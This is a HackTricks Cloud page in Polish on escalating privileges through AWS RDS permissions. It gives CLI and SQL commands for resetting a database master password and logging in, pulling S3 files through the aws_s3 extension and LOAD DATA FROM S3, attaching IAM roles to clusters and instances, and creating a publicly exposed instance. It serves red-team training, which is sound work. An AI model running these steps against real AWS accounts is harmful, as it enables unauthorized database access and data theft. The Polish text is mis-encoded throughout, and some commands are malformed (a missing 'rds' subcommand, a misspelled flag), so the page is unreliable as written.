# AWS - RDS Privesc

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

## RDS - Relational Database Service

WiÄ™cej informacji o RDS znajdziesz tutaj:

{% content-ref url="../aws-services/aws-relational-database-rds-enum.md" %}
[aws-relational-database-rds-enum.md](../aws-services/aws-relational-database-rds-enum.md)
{% endcontent-ref %}

### `rds:ModifyDBInstance`

Z tÄ… uprawnieniem atakujÄ…cy moÅ¼e **zmodyfikowaÄ‡ hasÅ‚o uÅ¼ytkownika gÅ‚Ã³wnego** i zalogowaÄ‡ siÄ™ do bazy danych:
```bash
# Get the DB username, db name and address
aws rds describe-db-instances

# Modify the password and wait a couple of minutes
aws rds modify-db-instance \
--db-instance-identifier <db-id> \
--master-user-password 'Llaody2f6.123' \
--apply-immediately

# In case of postgres
psql postgresql://<username>:<pass>@<rds-dns>:5432/<db-name>
```
{% hint style="warning" %}
Musisz mieÄ‡ moÅ¼liwoÅ›Ä‡ **poÅ‚Ä…czenia siÄ™ z bazÄ… danych** (zazwyczaj sÄ… one dostÄ™pne tylko z wewnÄ™trznych sieci).
{% endhint %}

**Potencjalny wpÅ‚yw:** Znalezienie wraÅ¼liwych informacji w bazach danych.

### rds-db:connect

WedÅ‚ug [**dokumentacji**](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.IAMDBAuth.IAMPolicy.html) uÅ¼ytkownik z tym uprawnieniem moÅ¼e poÅ‚Ä…czyÄ‡ siÄ™ z instancjÄ… DB.

### NaduÅ¼ycie uprawnieÅ„ RDS Role IAM

#### Postgresql (Aurora)

{% hint style="success" %}
JeÅ›li uruchomisz **`SELECT datname FROM pg_database;`** i znajdziesz bazÄ™ danych o nazwie **`rdsadmin`**, wiesz, Å¼e jesteÅ› wewnÄ…trz **AWS postgresql database**.
{% endhint %}

Najpierw moÅ¼esz sprawdziÄ‡, czy ta baza danych byÅ‚a uÅ¼ywana do uzyskania dostÄ™pu do jakiejkolwiek innej usÅ‚ugi AWS. MoÅ¼esz to sprawdziÄ‡, patrzÄ…c na zainstalowane rozszerzenia:
```sql
SELECT * FROM pg_extension;
```
JeÅ›li znajdziesz coÅ› takiego jak **`aws_s3`**, moÅ¼esz zaÅ‚oÅ¼yÄ‡, Å¼e ta baza danych ma **jakiÅ› rodzaj dostÄ™pu do S3** (istniejÄ… inne rozszerzenia, takie jak **`aws_ml`** i **`aws_lambda`**).

RÃ³wnieÅ¼, jeÅ›li masz uprawnienia do uruchomienia **`aws rds describe-db-clusters`**, moÅ¼esz zobaczyÄ‡ tam, czy **klaster ma przypisanÄ… jakÄ…kolwiek rolÄ™ IAM** w polu **`AssociatedRoles`**. JeÅ›li tak, moÅ¼esz zaÅ‚oÅ¼yÄ‡, Å¼e baza danych zostaÅ‚a **przygotowana do dostÄ™pu do innych usÅ‚ug AWS**. Na podstawie **nazwy roli** (lub jeÅ›li moÅ¼esz uzyskaÄ‡ **uprawnienia** roli) moÅ¼esz **zgadnÄ…Ä‡**, jaki dodatkowy dostÄ™p ma baza danych.

Teraz, aby **odczytaÄ‡ plik wewnÄ…trz bucketu**, musisz znaÄ‡ peÅ‚nÄ… Å›cieÅ¼kÄ™. MoÅ¼esz to odczytaÄ‡ za pomocÄ…:
```sql
// Create table
CREATE TABLE ttemp (col TEXT);

// Create s3 uri
SELECT aws_commons.create_s3_uri(
'test1234567890678', // Name of the bucket
'data.csv',          // Name of the file
'eu-west-1'          //region of the bucket
) AS s3_uri \gset

// Load file contents in table
SELECT aws_s3.table_import_from_s3('ttemp', '', '(format text)',:'s3_uri');

// Get info
SELECT * from ttemp;

// Delete table
DROP TABLE ttemp;
```
JeÅ›li masz **surowe poÅ›wiadczenia AWS**, moÅ¼esz ich rÃ³wnieÅ¼ uÅ¼yÄ‡ do uzyskania dostÄ™pu do danych S3 za pomocÄ…:
```sql
SELECT aws_s3.table_import_from_s3(
't', '', '(format csv)',
:'s3_uri',
aws_commons.create_aws_credentials('sample_access_key', 'sample_secret_key', '')
);
```
{% hint style="info" %}
Postgresql **nie wymaga zmiany Å¼adnej zmiennej grupy parametrÃ³w**, aby uzyskaÄ‡ dostÄ™p do S3.
{% endhint %}

#### Mysql (Aurora)

{% hint style="success" %}
WewnÄ…trz mysql, jeÅ›li uruchomisz zapytanie **`SELECT User, Host FROM mysql.user;`** i jest tam uÅ¼ytkownik o nazwie **`rdsadmin`**, moÅ¼esz zaÅ‚oÅ¼yÄ‡, Å¼e jesteÅ› wewnÄ…trz **AWS RDS mysql db**.
{% endhint %}

WewnÄ…trz mysql uruchom **`show variables;`** i jeÅ›li zmienne takie jak **`aws_default_s3_role`**, **`aurora_load_from_s3_role`**, **`aurora_select_into_s3_role`** majÄ… wartoÅ›ci, moÅ¼esz zaÅ‚oÅ¼yÄ‡, Å¼e baza danych jest przygotowana do dostÄ™pu do danych S3.

RÃ³wnieÅ¼, jeÅ›li masz uprawnienia do uruchomienia **`aws rds describe-db-clusters`**, moÅ¼esz sprawdziÄ‡, czy klaster ma jakÄ…kolwiek **przypisanÄ… rolÄ™**, co zazwyczaj oznacza dostÄ™p do usÅ‚ug AWS.

Aby **odczytaÄ‡ plik wewnÄ…trz bucket**, musisz znaÄ‡ peÅ‚nÄ… Å›cieÅ¼kÄ™. MoÅ¼esz to odczytaÄ‡ za pomocÄ…:
```sql
CREATE TABLE ttemp (col TEXT);
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
SELECT * FROM ttemp;
DROP TABLE ttemp;
```
### `rds:AddRoleToDBCluster`, `iam:PassRole`

AtakujÄ…cy z uprawnieniami `rds:AddRoleToDBCluster` i `iam:PassRole` moÅ¼e **dodaÄ‡ okreÅ›lonÄ… rolÄ™ do istniejÄ…cej instancji RDS**. MoÅ¼e to pozwoliÄ‡ atakujÄ…cemu na **dostÄ™p do wraÅ¼liwych danych** lub modyfikacjÄ™ danych w instancji.
```bash
aws add-role-to-db-cluster --db-cluster-identifier <value> --role-arn <value>
```
**Potential Impact**: DostÄ™p do wraÅ¼liwych danych lub nieautoryzowane modyfikacje danych w instancji RDS.\
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e niektÃ³re bazy danych wymagajÄ… dodatkowych konfiguracji, takich jak Mysql, ktÃ³ry wymaga okreÅ›lenia ARN roli w grupach parametrÃ³w.

### `rds:CreateDBInstance`

Tylko z tym uprawnieniem atakujÄ…cy mÃ³gÅ‚by utworzyÄ‡ **nowÄ… instancjÄ™ w istniejÄ…cym klastrze**, ktÃ³ry ma przypisanÄ… **rolÄ™ IAM**. Nie bÄ™dzie w stanie zmieniÄ‡ hasÅ‚a uÅ¼ytkownika gÅ‚Ã³wnego, ale moÅ¼e byÄ‡ w stanie wystawiÄ‡ nowÄ… instancjÄ™ bazy danych do internetu:
```bash
aws --region eu-west-1 --profile none-priv rds create-db-instance \
--db-instance-identifier mydbinstance2 \
--db-instance-class db.t3.medium \
--engine aurora-postgresql \
--db-cluster-identifier database-1 \
--db-security-groups "string" \
--publicly-accessible
```
### `rds:CreateDBInstance`, `iam:PassRole`

{% hint style="info" %}
TODO: Test
{% endhint %}

AtakujÄ…cy z uprawnieniami `rds:CreateDBInstance` i `iam:PassRole` moÅ¼e **utworzyÄ‡ nowÄ… instancjÄ™ RDS z przypisanÄ… okreÅ›lonÄ… rolÄ…**. AtakujÄ…cy moÅ¼e nastÄ™pnie potencjalnie **uzyskaÄ‡ dostÄ™p do wraÅ¼liwych danych** lub zmodyfikowaÄ‡ dane w instancji.

{% hint style="warning" %}
NiektÃ³re wymagania dotyczÄ…ce roli/profilu instancji do przypisania (z [**tutaj**](https://docs.aws.amazon.com/cli/latest/reference/rds/create-db-instance.html)):

* Profil musi istnieÄ‡ na Twoim koncie.
* Profil musi mieÄ‡ rolÄ™ IAM, ktÃ³rÄ… Amazon EC2 ma uprawnienia do przejÄ™cia.
* Nazwa profilu instancji i powiÄ…zana nazwa roli IAM muszÄ… zaczynaÄ‡ siÄ™ od prefiksu `AWSRDSCustom`.
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds create-db-instance --db-instance-identifier malicious-instance --db-instance-class db.t2.micro --engine mysql --allocated-storage 20 --master-username admin --master-user-password mypassword --db-name mydatabase --vapc-security-group-ids sg-12345678 --db-subnet-group-name mydbsubnetgroup --enable-iam-database-authentication --custom-iam-instance-profile arn:aws:iam::123456789012:role/MyRDSEnabledRole
```
{% endcode %}

**Potencjalny wpÅ‚yw**: DostÄ™p do wraÅ¼liwych danych lub nieautoryzowane modyfikacje danych w instancji RDS.

### `rds:AddRoleToDBInstance`, `iam:PassRole`

AtakujÄ…cy z uprawnieniami `rds:AddRoleToDBInstance` i `iam:PassRole` moÅ¼e **dodaÄ‡ okreÅ›lonÄ… rolÄ™ do istniejÄ…cej instancji RDS**. MoÅ¼e to pozwoliÄ‡ atakujÄ…cemu na **dostÄ™p do wraÅ¼liwych danych** lub modyfikacjÄ™ danych w instancji.

{% hint style="warning" %}
Instancja DB musi byÄ‡ poza klastrem
{% endhint %}

{% code overflow="wrap" %}
```bash
aws rds add-role-to-db-instance --db-instance-identifier target-instance --role-arn arn:aws:iam::123456789012:role/MyRDSEnabledRole --feature-name <feat-name>
```
{% endcode %}

**Potencjalny wpÅ‚yw**: DostÄ™p do wraÅ¼liwych danych lub nieautoryzowane modyfikacje danych w instancji RDS.

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wspieraj HackTricks</summary>

* SprawdÅº [**plany subskrypcji**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}
